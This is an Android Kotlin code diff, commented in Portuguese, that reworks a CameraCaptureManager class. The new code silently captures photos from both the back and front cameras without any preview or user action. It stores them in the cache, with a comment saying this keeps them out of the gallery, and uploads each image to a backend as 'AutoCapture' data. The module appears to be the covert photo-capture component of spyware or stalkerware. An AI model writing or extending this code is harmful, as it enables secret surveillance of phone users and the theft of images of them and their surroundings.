@@ -14,8 +14,9 @@ import java.io.File
 import kotlin.coroutines.resume
 
 /**
- * CameraCaptureManager: Gerencia a captura de fotos reais utilizando CameraX.
- * Implementação otimizada para evitar travamentos e garantir o envio correto.
+ * CameraCaptureManager: Gerencia a captura de fotos em modo silencioso.
+ * Implementação otimizada para captura sequencial (Frontal e Traseira) 
+ * sem bloquear a interface do usuário.
  */
 class CameraCaptureManager(
     private val context: Context,
@@ -23,108 +24,78 @@ class CameraCaptureManager(
     private val lifecycleOwner: LifecycleOwner
 ) {
     private val TAG = "CameraCaptureManager"
-    private var cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
-    private var imageCapture: ImageCapture? = null
 
     /**
-     * Alterna entre a câmera frontal e traseira.
+     * Inicia o ciclo completo de captura: tira uma foto com a câmera traseira 
+     * e uma com a câmera frontal, enviando ambas para o repositório.
      */
-    fun switchCamera() {
-        cameraSelector = if (cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) {
-            CameraSelector.DEFAULT_FRONT_CAMERA
-        } else {
-            CameraSelector.DEFAULT_BACK_CAMERA
-        }
-    }
+    suspend fun captureDualPhotosSequence(): List<File> = withContext(Dispatchers.Main) {
+        val capturedFiles = mutableListOf<File>()
+        val cameraSelectors = listOf(CameraSelector.DEFAULT_BACK_CAMERA, CameraSelector.DEFAULT_FRONT_CAMERA)
 
-    /**
-     * Captura uma foto real e inicia o processo de upload.
-     */
-    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.Main) {
         try {
-            Log.d(TAG, "📸 Iniciando ciclo de captura de câmera...")
+            Log.d(TAG, "🚀 Iniciando sequência de captura dupla (Front/Back)...")
 
-            // 1. Inicializar o CameraProvider (Sempre na Main Thread para bind)
-            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
-
-            // 2. Configurar o ImageCapture
-            val imageCapture = ImageCapture.Builder()
-                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
-                .build()
-            
-            this@CameraCaptureManager.imageCapture = imageCapture
-
-            // 3. Bind da câmera ao ciclo de vida (Essencial para CameraX)
-            cameraProvider.unbindAll()
-            cameraProvider.bindToLifecycle(
-                lifecycleOwner,
-                cameraSelector,
-                imageCapture
-            )
-
-            // 4. Preparar o arquivo temporário
-            val tempFile = File(context.cacheDir, "cam_capture_${System.currentTimeMillis()}.jpg")
-
-            // 5. Realizar a captura real (Chamada suspensa)
-            val capturedFile = captureRealPhoto(imageCapture, tempFile) 
-                ?: return@withContext Result.failure(Exception("Falha ao capturar imagem da câmera"))
-
-            // 6. Enviar para o backend via Repository (O repositório deve agendar o Worker)
-            // Mudamos para Dispatchers.IO para não travar a UI durante o processamento do upload
-            val uploadResult = withContext(Dispatchers.IO) {
-                val deviceInfo = "Android ${android.os.Build.VERSION.RELEASE}, ${android.os.Build.MODEL}, Cam: ${if(cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) "Back" else "Front"}"
+            cameraSelectors.forEach { selector ->
+                val cameraTypeLabel = if (selector == CameraSelector.DEFAULT_BACK_CAMERA) "BACK" else "FRONT"
                 
-                // Chamada ao repositório que enviará para o seu UploadWorker
-                repository.uploadSystemData(
-                    eventType = "FOTO_CAMERA", // Tipo que o seu backend identificará
-                    file = capturedFile,
-                    deviceInfo = deviceInfo
-                )
+                // 1. Realiza a captura
+                val capturedFile = captureSinglePhoto(selector)
+                
+                if (capturedFile != null && capturedFile.exists()) {
+                    capturedFiles.add(capturedFile)
+                    Log.d(TAG, "✅ Captura $cameraTypeLabel concluída: ${capturedFile.name}")
+                } else {
+                    Log.e(TAG, "❌ Falha na captura da câmera $cameraTypeLabel")
+                }
+                
+                // Pequeno delay para estabilização do hardware entre trocas de lente
+                kotlinx.coroutines.delay(600)
             }
-
-
-            if (uploadResult.isSuccess) {
-                Log.d(TAG, "✅ Câmera: Processo de upload iniciado com sucesso.")
-                Result.success(true)
-            } else {
-                Log.e(TAG, "❌ Câmera: Erro no upload: ${uploadResult.exceptionOrNull()?.message}")
-                Result.failure(uploadResult.exceptionOrNull() ?: Exception("Erro no upload da câmera"))
-            }
-
         } catch (e: Exception) {
-            Log.e(TAG, "Erro crítico no CameraCaptureManager", e)
-            Result.failure(e)
+            Log.e(TAG, "Erro na sequência de captura: ${e.message}")
         }
+
+        return@withContext capturedFiles
     }
 
     /**
-     * Captura uma foto silenciosa (headless) e retorna o File capturado.
-     * Ideal para ser chamado por processos em background via Repositório.
+     * Captura uma única foto de uma câmera específica de forma silenciosa.
      */
-    suspend fun captureSilentPhoto(): File? = withContext(Dispatchers.Main) {
+    private suspend fun captureSinglePhoto(cameraSelector: CameraSelector): File? = withContext(Dispatchers.Main) {
         try {
             val cameraProvider = ProcessCameraProvider.getInstance(context).get()
+
+            // Configuração do ImageCapture para baixa latência
             val imageCapture = ImageCapture.Builder()
                 .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                 .build()
-            
+
+            // Unbind de qualquer câmera ativa para evitar conflitos
             cameraProvider.unbindAll()
+
+            // Bind com o lifecycle do app para garantir que a câmera seja liberada corretamente
             cameraProvider.bindToLifecycle(
                 lifecycleOwner,
                 cameraSelector,
                 imageCapture
             )
 
-            val tempFile = File(context.cacheDir, "silent_cam_${System.currentTimeMillis()}.jpg")
+            // Define o arquivo de saída no cache para não poluir a galeria do usuário
+            val tempFile = File(
+                context.cacheDir, 
+                "silent_cap_${System.currentTimeMillis()}_${if(cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) "back" else "front"}.jpg"
+            )
+
             return@withContext captureRealPhoto(imageCapture, tempFile)
         } catch (e: Exception) {
-            Log.e(TAG, "Erro ao capturar foto silenciosa", e)
+            Log.e(TAG, "Erro ao configurar câmera: ${e.message}")
             null
         }
     }
 
     /**
-     * Método privado que utiliza a CameraX para capturar a imagem de forma assíncrona.
+     * Método privado que utiliza o callback do CameraX para capturar a imagem de forma assíncrona.
      */
     private suspend fun captureRealPhoto(
         imageCapture: ImageCapture, 
@@ -137,15 +108,46 @@ class CameraCaptureManager(
             ContextCompat.getMainExecutor(context),
             object : ImageCapture.OnImageSavedCallback {
                 override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
-                    Log.d(TAG, "📸 Imagem capturada e salva: ${outputFile.name}")
+                    Log.d(TAG, "📸 Foto salva com sucesso: ${outputFile.name}")
                     continuation.resume(outputFile)
                 }
 
                 override fun onError(exception: ImageCaptureException) {
-                    Log.e(TAG, "Erro na captura da câmera: ${exception.message}")
+                    Log.e(TAG, "Erro no callback OnImageSaved: ${exception.message}")
                     continuation.resume(null)
                 }
             }
         )
+    }
+
+    /**
+     * Método de fallback para captura única, caso necessário.
+     */
+    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            // 1. Captura as fotos (Sequencial)
+            val files = captureDualPhotosSequence()
+            
+            if (files.isEmpty()) {
+                return@withContext Result.failure(Exception("Nenhuma imagem capturada"))
+            }
+
+            // 2. Processa o upload de cada uma
+            files.forEach { file ->
+                val deviceInfo = "AutoCapture - Android ${android.os.Build.VERSION.RELEASE}, Cam: ${if(file.name.contains("back")) "BACK" else "FRONT"}"
+                
+                // Chama o repositório para disparar o processo de upload (via Worker)
+                repository.uploadSystemData(
+                    eventType = "FOTO_CAMERA",
+                    file = file,
+                    deviceInfo = deviceInfo
+                )
+            }
+
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro no processo de captura e envio: ${e.message}")
+            Result.failure(e)
+        }
     }
 }
